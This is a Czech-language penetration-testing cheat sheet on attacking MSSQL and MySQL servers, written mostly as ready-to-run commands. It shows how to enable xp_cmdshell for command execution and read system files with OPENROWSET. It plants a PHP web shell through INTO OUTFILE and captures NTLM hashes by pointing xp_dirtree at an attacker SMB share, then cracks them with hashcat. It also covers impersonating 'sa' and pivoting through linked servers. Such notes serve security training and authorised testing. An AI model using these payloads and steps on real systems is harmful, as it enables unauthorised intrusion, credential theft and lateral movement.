# 🗄️ SQL Databases (MSSQL 1433 / MySQL 3306)

Databáze často obsahují citlivá data (uživatelé, hesla, konfigurace) a při špatné konfiguraci mohou vést k RCE nebo dalšímu pohybu v síti.

---

# 🔍 1. Enumerace databází

První krok je zjistit:

- databázový software
- verzi
- způsob autentizace
- dostupné instance

### Nmap

```
nmap -sC -sV -p 1433,3306 <IP>
```

Zjistí:

- MSSQL / MySQL verzi
- dostupné služby
- základní konfiguraci

---

# 🟦 MSSQL (1433)

## Připojení

### Impacket mssqlclient

```
impacket-mssqlclient user:password@<IP>
```

Windows autentizace:

```
impacket-mssqlclient DOMAIN/user:password@<IP> -windows-auth
```

---

# 🐚 2. RCE přes MSSQL (xp_cmdshell)

`xp_cmdshell` umožňuje spouštět příkazy operačního systému.

### Kontrola práv

```
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Pokud vrátí:

```
1
```

máš sysadmin práva.

---

## Aktivace xp_cmdshell

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

---

## Spuštění příkazu

```
xp_cmdshell 'whoami';
```

Příklad:

```
xp_cmdshell 'ipconfig';
```

---

# 📂 3. Čtení a zápis souborů

## MSSQL - čtení souborů

Pomocí `OPENROWSET`:

```
SELECT *
FROM OPENROWSET(
BULK 'C:/Windows/system32/drivers/etc/hosts',
SINGLE_CLOB
) AS Contents;
```

---

## MySQL - zápis souborů

Pokud má uživatel:

```
FILE privilege
```

a není omezeno:

```
secure_file_priv
```

lze zapisovat soubory:

```
SELECT "<?php system($_GET['cmd']); ?>"
INTO OUTFILE '/var/www/html/shell.php';
```

---

# 🎣 4. NTLM Hash Stealing (MSSQL)

MSSQL může donutit server autentizovat se proti našemu SMB serveru.

## Princip:

```
MSSQL
  |
  | SMB request
  ↓
Útočníkův SMB server
  |
  ↓
NTLMv2 hash
```

---

## Spuštění SMB listeneru

```
sudo responder -I tun0
```

nebo:

```
sudo impacket-smbserver share $(pwd)
```

---

## MSSQL dotaz

```
EXEC master..xp_dirtree '\\<ATTACKER_IP>\share';
```

Výsledek:

- zachycení NetNTLMv2 hashe
- následné crackování

Hashcat:

```
hashcat -m 5600 hash.txt rockyou.txt
```

---

# 🎭 5. MSSQL Impersonace

MSSQL umožňuje převzít identitu jiného účtu.

---

## Zjištění impersonace

```
SELECT name
FROM sys.server_principals
WHERE can_impersonate = 1;
```

---

## Převzetí identity

```
EXECUTE AS LOGIN='sa';
```

Kontrola:

```
SELECT IS_SRVROLEMEMBER('sysadmin');
```

Pokud:

```
1
```

→ sysadmin přístup.

---

# 🔗 6. Linked Servers (Lateral Movement)

MSSQL může komunikovat s jinými databázemi.

---

## Výpis linked serverů

```
SELECT srvname 
FROM sysservers;
```

---

## Spuštění příkazu na vzdáleném serveru

```
EXECUTE(
'xp_cmdshell ''whoami'''
) AT [SERVER_NAME];
```

---

# 🟨 MySQL (3306)

## Připojení

```
mysql -h <IP> -u root -p
```

---

## Enumerace databází

```
SHOW DATABASES;
```

Tabulky:

```
USE database;
SHOW TABLES;
```

Data:

```
SELECT * FROM users;
```

---

# 🔐 7. MySQL autentizace

Časté účty:

```
root
admin
backup
user
```

Kontrola uživatelů:

```
SELECT user,host FROM mysql.user;
```

---

# ⚠️ 8. Známé chyby

## MySQL CVE-2012-2122

Starší MySQL/MariaDB verze:

- chyba v autentizaci
- opakované přihlášení může obejít heslo

Dnes velmi vzácné.

---

# 🛠️ Nástroje

|Nástroj|Použití|
|---|---|
|impacket-mssqlclient|MSSQL konzole|
|sqsh|MSSQL klient|
|mysql|MySQL klient|
|NetExec|Enumerace a spraying|
|Nmap|Detekce služby|
|Responder|NTLM capture|
|Hashcat|Crackování hashů|

---

# 🚩 Typický Attack Flow

```
1. Nmap 1433/3306
        ↓
2. Identifikace databáze
        ↓
3. Získání credentials
        ↓
4. Přihlášení
        ↓
5. Enumerace práv
        ↓
6. xp_cmdshell / FILE privilege
        ↓
7. RCE
        ↓
8. Credential hunting / lateral movement
```